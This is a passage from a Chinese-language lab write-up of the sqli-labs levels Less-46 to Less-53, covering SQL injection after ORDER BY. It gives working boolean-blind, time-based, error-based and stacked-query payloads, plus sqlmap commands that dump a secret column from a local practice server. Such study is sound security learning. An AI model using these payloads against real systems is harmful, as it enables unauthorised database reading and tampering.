+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">0</span><span class="string">&#x27;) or sleep(1);&amp;login_user=admin123&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<p>缺点自然是需要探测括号的包裹情况。</p>
+</li>
+</ol>
+<p>直接登录敏感账户即可：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login_password=<span class="number">1</span><span class="string">&#x27;) or &#x27;</span><span class="number">1</span><span class="string">&#x27; and username=mid((select secret_FPMB from challenges.5idc4x45h8),1,12);&amp;login_user=dumb&amp;mysubmit=Login</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h2><p>无引号与括号包裹，注入点在 <code>order by</code> 后面指定排序参考字段。由于 <code>union</code> 需要放在 <code>order by</code> 前面使用，因此此处无联合注入。</p>
+<hr>
+<p>本题的注入思路非常有趣。让我学到了很多很多东西。</p>
+<p>由于查询结果有 3 列，起初想用 <code>order by 4-if(1=1,0,1)</code> 实现布尔盲注，可是后来发现 <code>order by</code> 后跟表达式与我想象中的效果并不一样。</p>
+<blockquote>
+<p><code>order by</code> 后一般可以跟”数字”、”字段名”与其他表达式。</p>
+<p>当直接传入一个数字时，如 <code>order by 2</code> ，其效果是选取搜索结果中位居第二列的字段内容作为排序依据。当传入字段名时，效果类似，根据传入的字段内容作为排序依据。<br>注意传入数值时不接受字符串；传入字段内容时也不接受字符串，只接受字面量（裸字符串）。</p>
+<p>但如果传入的是表达式，即使其结果是数值，<code>order by</code> 会用与直接传入的数值不同的解析方式解析表达式的结果。例如传入 <code>order by 4-1</code> ，<code>order by</code> 检索查询结果的每一行时都会计算该表达式的值为 3，并为该行标记一个排序属性为 3。当计算完毕所有行的该属性，<code>order by</code> 会根据该排序属性从小到大排序各行结果。由于大家都是 3，因此该案例所有结果按原序排列（原序即数据的插入顺序）。<br>不过有一种特殊情况，如果表达式返回的结果是合法字段名的裸字符串（即不是引号包裹的字符串），那么 <code>order by</code> 依然会正确根据字段进行排序。</p>
+<p>实际上 <code>order by</code> 处理排序时就是为每行数据添加数个用于排序的属性值，并根据该属性值从小到大（ASC）或从大到小（DESC）排序。当传入的是直接的数值或字段名时，<code>order by</code> 会做特殊处理，将其对应到查询结果中每一列的数据，以该数据为该行的排序依据元素，最后根据排序元素以某种顺序排序各行结果。</p>
+<p>mysql 中的 <code>rand()</code> 函数每次调用都会随机返回 <code>[0,1)</code> 之间的某个小数，因此 <code>order by rand()</code> 可以让结果乱序。当检索某行结果时 <code>rand()</code> 返回的值较大，该行结果（如果排序是 ASC）将会排在靠后的位置。</p>
+</blockquote>
+<p><code>order by 4-if(1=1,0,1)</code> 并不能实现想象中的『报错或有结果』的二元布尔盲注的效果。</p>
+<p>但我们依然可以用 <code>if(1=1,id,username)</code> 实现布尔盲注，根据排序依据的列不同，返回的结果顺序有所不同，据此也能实现布尔盲注，但只能在无引号包裹的注入点使用。在 SQL 中逻辑表达式只会返回逻辑类型的结果，而非表达式中某个子元素的结果。因此当周围有引号时就无法返回裸字符串形式的合法字段名。</p>
+<hr>
+<p>但 sqlmap 提供了更好的 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=(<span class="title function_ invoke__">SELECT</span> (CASE <span class="title function_ invoke__">WHEN</span> (<span class="number">7747</span>=<span class="number">7747</span>) THEN <span class="number">0x342d696628313d312c312c3029</span> <span class="title function_ invoke__">ELSE</span> (SELECT <span class="number">5250</span> UNION SELECT <span class="number">5258</span>) END))</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=(<span class="title function_ invoke__">SELECT</span> (CASE <span class="title function_ invoke__">WHEN</span> (<span class="number">5180</span>=<span class="number">5305</span>) THEN <span class="number">0x342d696628313d312c312c3029</span> <span class="title function_ invoke__">ELSE</span> (SELECT <span class="number">5305</span> UNION SELECT <span class="number">9926</span>) END))</span><br></pre></td></tr></table></figure></div>
+
+<p>由于子查询语句仍然可用，写一个带 <code>case when</code> 条件的子查询语句，其后的逻辑表达式用于盲注，如果为真返回结果只有一行，若为假则执行一个联合查询语句，由于其返回结果多与一行，会触发 mysql 报错。如此一来完全脱离于注入点的上下文，也能凭空创造出一个『报错或有结果』的完美布尔盲注环境。</p>
+<p>sqlmap-payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-46/?<span class="built_in">sort</span>=4-<span class="keyword">if</span>(1=1,1,0) -p <span class="built_in">sort</span> --technique B -b --flush-session -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex</span><br></pre></td></tr></table></figure></div>
+
+<p><code>--hex</code> 省略会导致内容恢复失败。</p>
+<hr>
+<p>可以执行表达式，自然时间盲注也是可行的，PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap-payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-46/?<span class="built_in">sort</span>=4-<span class="keyword">if</span>(1=1,1,0) -p <span class="built_in">sort</span> --technique T -b --flush-session -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex</span><br></pre></td></tr></table></figure></div>
+
+<p>但由于 <code>order by</code> 会检索每行结果导致多次执行 <code>sleep()</code> ，其实际延时长度与查询结果的数量成正比，这可能会导致效率低下。当然，如果是自己写脚本，可以添加 <code>timeout</code> 参数来规避问题。</p>
+<hr>
+<p>有报错回显，也可以报错注入：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="title function_ invoke__">extractvalue</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(select secret_FPMB <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>看了一眼后端源码，用的是 <code>mysql_query()</code> ，没有堆叠注入的问题。</p>
+<h2 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h2><p>类似上一关，单引号包裹，注入点在 <code>order by</code> 后，布尔盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span><span class="string">&#x27; or if(1=0,1,(select 123 union select 321)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>本以为直接 sqlmap 跑就行，payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-47/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B -b --flush-session -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex --batch</span><br></pre></td></tr></table></figure></div>
+
+<p>但这里 sqlmap 出了一点问题。他成功的恢复了后端 mysql 的版本为 5.7.26，却无法获取指定表中的数据数量：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[WARNING] unable <span class="keyword">to</span> retrieve the number <span class="keyword">of</span> <span class="keyword">column</span>(s) <span class="string">&#x27;secret_FPMB&#x27;</span> entries <span class="keyword">for</span> <span class="keyword">table</span> <span class="string">&#x27;5idc4x45h8&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;challenges&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>查看其 payload 后发现，它在本关检测出的注入类型如下：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL RLIKE <span class="type">boolean</span><span class="operator">-</span>based blind <span class="operator">-</span> <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause</span><br></pre></td></tr></table></figure></div>
+
+<p>是一个 <code>rlike</code> 可利用的布尔盲注。该注入点的利用思路是 <code>&lt;string&gt; rlike &#39;(&#39;</code> 由于正则表达式的捕获分组括号对不完整会触发报错，例如：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span> rlike <span class="number">0x28</span>;</span><br><span class="line">ERROR <span class="number">1139</span> (<span class="number">42000</span>): Got error <span class="string">&#x27;parentheses not balanced&#x27;</span> <span class="keyword">from</span> regexp</span><br></pre></td></tr></table></figure></div>
+
+<p>利用该特点，<code>rlike</code> 可用于构造布尔盲注。</p>
+<p>sqlmap 在还原数据库版本时用的 payload 形如：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; RLIKE (SELECT (CASE WHEN (ORD(MID((HEX(IFNULL(CAST(VERSION() AS NCHAR),0x20))),13,1))&gt;1) THEN 1 ELSE 0x28 END))-- gKZx</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这时 <code>rlike</code> 正常工作。而还原数据表记录数量时用的 payload 形如：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT HEX(IFNULL(CAST(COUNT(*) AS NCHAR),0x20)) FROM challenges.`5idc4x45h8`),1,1))&gt;66) THEN 1 ELSE 0x28 END))-- tYNF</span></span><br></pre></td></tr></table></figure></div>
+
+<p>在本地测试这个 payload 对应的查询语句，发现 <code>rlike</code> 并没有发挥出应有的作用，测试以下语句：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看目标值</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ORD(MID((<span class="keyword">SELECT</span> HEX(IFNULL(<span class="built_in">CAST</span>(<span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> <span class="type">NCHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> challenges.`<span class="number">5</span>idc4x45h8`),<span class="number">1</span>,<span class="number">1</span>));</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span> <span class="number">51</span></span><br><span class="line"># 直接检查 rlike 运算后的结果</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span> RLIKE (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (ORD(MID((<span class="keyword">SELECT</span> HEX(IFNULL(<span class="built_in">CAST</span>(<span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> <span class="type">NCHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> challenges.`<span class="number">5</span>idc4x45h8`),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">66</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>));</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">NULL</span></span><br></pre></td></tr></table></figure></div>
+
+<p>已知 <code>51&lt;66</code> ，因此返回的值应该是 <code>ELSE 0x28</code> 即 <code>&quot;(&quot;</code> ，理论上应该触发报错，但实际上却返回了一个 NULL。将比较运算改为 <code>&lt;66</code> ：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;1&#x27;</span> RLIKE (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (ORD(MID((<span class="keyword">SELECT</span> HEX(IFNULL(<span class="built_in">CAST</span>(<span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> <span class="type">NCHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> challenges.`<span class="number">5</span>idc4x45h8`),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&lt;</span><span class="number">66</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0x28</span> <span class="keyword">END</span>));</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span> <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
+
+<p> 会发现返回了一个 1，即 True，说明 <code>Then 1</code> 的内容它正常返回了，只是在返回 <code>ELSE 0x28</code> 时出问题了。经过测试，将 <code>0x28</code> 改为字符串，或者套上 select 都不行。结合前面能够恢复版本信息，猜测是从具体表中进行子查询会让 <code>rlike</code> 解析出现问题，导致返回 NULL。</p>
+<p>对于以上问题，我在 <code>msyql 5.7.26</code> 测试存在，在 <code>8.0.28</code> 测试出来不存在。</p>
+<p><strong>解决方法：</strong></p>
+<p>虽然 <code>rlike</code> 不能用，但还有其他 payload 可用，跳过 <code>rlike</code> 相关的 payload 即可，sqlmap 提供了 <code>--test-skip=rlike</code> 参数可以跳过所有含有 <code>rlike</code> 关键词的 payload。因此最终 payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-47/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B -b --flush-session -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex --test-skip <span class="string">&quot;rlike&quot;</span> --batch</span><br></pre></td></tr></table></figure></div>
+
+<p>该 payload 下，sqlmap 将本关的注入点归纳为：</p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MySQL <span class="operator">&gt;=</span> <span class="number">5.0</span> <span class="type">boolean</span><span class="operator">-</span>based blind <span class="operator">-</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span>, <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause</span><br></pre></td></tr></table></figure></div>
+
+<p>payload 形如：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;,(SELECT (CASE WHEN (ORD(MID((SELECT HEX(IFNULL(CAST(secret_FPMB AS NCHAR),0x20)) FROM challenges.`5idc4x45h8` ORDER BY secret_FPMB LIMIT 0,1),49,1))&gt;1) THEN 1 ELSE 1919*(SELECT 1919 FROM INFORMATION_SCHEMA.PLUGINS) END))-- jvTZ</span></span><br></pre></td></tr></table></figure></div>
+
+<p>利用子查询 <code>SELECT 1919 FROM INFORMATION_SCHEMA.PLUGINS</code> 返回多行触发报错的特性构造布尔盲注。</p>
+<hr>
+<p>时间盲注自然也是可以的，但效率太低，不推荐。</p>
+<p>由于有报错回显，可以直接报错注入：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select secret_FPMB from challenges.5idc4x45h8),0x7e)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h2><p>无报错回显的数字型注入，注入点在 <code>order by</code> 后。</p>
+<p>布尔盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">0</span>,<span class="number">1</span>,(select <span class="number">123</span> union select <span class="number">321</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap 一把梭了：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-48/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B -b --flush-session -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex --test-skip <span class="string">&quot;rlike&quot;</span> --batch</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h2><p>无报错回显的字符型注入，单引号包裹，注入点在 <code>order by</code> 后。</p>
+<p>布尔盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span><span class="string">&#x27; or if(1=0,1,(select 123 union select 321)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap-payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-49/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B -b --flush-session -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex --string <span class="string">&quot;Dumb&quot;</span> --level 2</span><br></pre></td></tr></table></figure></div>
+
+<p>非常的奇妙，本关检测出的 payload 类别是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AND boolean-based blind - WHERE or HAVING clause (subquery - comment)</span><br></pre></td></tr></table></figure></div>
+
+<p>该 payload 出现在 <code>level=2</code> 。同样是带单引号的布尔盲注，<code>Less-47</code> 在没有给出 <code>level</code> 参数的情况下，自动执行了许多高等级高风险的 payload 测试，猜测与其返回了报错信息有关。sqlmap 检测到这些报错信息自动进行了调整，允许部分更高级别的 payload 测试。</p>
+<p>虽然是这么推测，但我重新查看 Less-47 的 paylaod 测试时发现：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> the remaining tests, <span class="keyword">do</span> you want to include all tests <span class="keyword">for</span> <span class="string">&#x27;MySQL&#x27;</span> extending provided level (1) and risk (1) values? [Y/n] Y</span><br><span class="line">[01:33:12] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span></span><br><span class="line">[01:33:13] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[01:33:13] [INFO] testing <span class="string">&#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span></span><br><span class="line">[01:33:13] [INFO] testing <span class="string">&#x27;AND boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span></span><br><span class="line">[01:33:15] [INFO] testing <span class="string">&#x27;OR boolean-based blind - WHERE or HAVING clause (MySQL comment)&#x27;</span></span><br><span class="line">[01:33:17] [INFO] testing <span class="string">&#x27;OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)&#x27;</span></span><br><span class="line">[01:33:19] [INFO] testing <span class="string">&#x27;MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>上面问你是否测试 <code>level-1 risk-1</code> 的 payload，下面冒出来一大堆不符合该条件的 payload 类别。不是很懂。</p>
+<h2 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h2><p><code>rand()</code> 测试一下，无引号包裹，”Blind based”却有报错回显，注入点在 <code>order by</code> 后。</p>
+<p>报错注入 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="title function_ invoke__">extractvalue</span>(<span class="number">1</span>,<span class="title function_ invoke__">concat</span>(<span class="number">0x7e</span>,(select secret_FPMB <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>布尔盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">0</span>,<span class="number">1</span>,(select <span class="number">123</span> union select <span class="number">321</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap-payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-50/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B --flush-session --batch -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>看了一眼源码，用了 <code>mysqli_multi_query()</code> ，存在堆叠注入的漏洞。</p>
+<p>向当前表 <code>id=59</code> 处插入 secret：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span>; replace into security.<span class="title function_ invoke__">users</span>(id,username,password) <span class="title function_ invoke__">values</span>(<span class="number">59</span>,(select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">1</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8),(select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">13</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8));</span><br></pre></td></tr></table></figure></div>
+
+<p>直接查询就能看到。</p>
+<h2 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h2><p>单引号包裹，注入点在 <code>order by</code> 后，有报错回显（”Blind Based”?），不知道和 less-49 的区别是什么。</p>
+<p>报错注入 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select secret_FPMB from challenges.5idc4x45h8),0x7e)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>布尔盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span><span class="string">&#x27; or if(1=0,1,(select 123 union select 321)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap-payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-51/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B --flush-session --batch -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex --test-skip rlike</span><br></pre></td></tr></table></figure></div>
+
+
+
+<hr>
+<p>堆叠注入，向当前表 <code>id=60</code> 处插入 secret：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span><span class="string">&#x27;; replace into security.users(id,username,password) values(60,(select mid(secret_FPMB,1,12) from challenges.5idc4x45h8),(select mid(secret_FPMB,13,12) from challenges.5idc4x45h8));</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h2><p>注入点在 <code>order by</code> 后，<code>rand()</code> 测试出无引号包裹，无报错回显。</p>
+<p>布尔盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span> <span class="keyword">or</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">0</span>,<span class="number">1</span>,(select <span class="number">123</span> union select <span class="number">321</span>))</span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap-payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-52/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B --flush-session --batch --level 2 -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>堆叠注入 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span>; replace into security.<span class="title function_ invoke__">users</span>(id,username,password) <span class="title function_ invoke__">values</span>(<span class="number">61</span>,(select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">1</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8),(select <span class="title function_ invoke__">mid</span>(secret_FPMB,<span class="number">13</span>,<span class="number">12</span>) <span class="keyword">from</span> challenges.<span class="number">5</span>idc4x45h8));</span><br></pre></td></tr></table></figure></div>
+
+<p>向当前表中 <code>id=61</code> 处插入 secret，直接查询就可见。</p>
+<h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>注入点在 <code>order by</code> 后，<code>rand()</code> 测试出单引号包裹，无报错回显。</p>
+<p>布尔盲注 PoC：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">0</span><span class="string">&#x27; or if(1=0,1,(select 123 union select 321)) or &#x27;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></div>
+
+<p>sqlmap-payload：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://172.21.240.1:83/sqli-labs/Less-53/?<span class="built_in">sort</span>=1 -p <span class="built_in">sort</span> --technique B --flush-session --batch --level 2 -D challenges -T 5idc4x45h8 -C secret_FPMB --dump --hex</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<p>堆叠注入 payload：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort=<span class="number">1</span><span class="string">&#x27;; replace into security.users(id,username,password) values(62,(select mid(secret_FPMB,1,12) from challenges.5idc4x45h8),(select mid(secret_FPMB,13,12) from challenges.5idc4x45h8));</span></span><br></pre></td></tr></table></figure></div>
+
+<p>向当前表中 <code>id=62</code> 处插入 secret，直接查询就可见。</p>
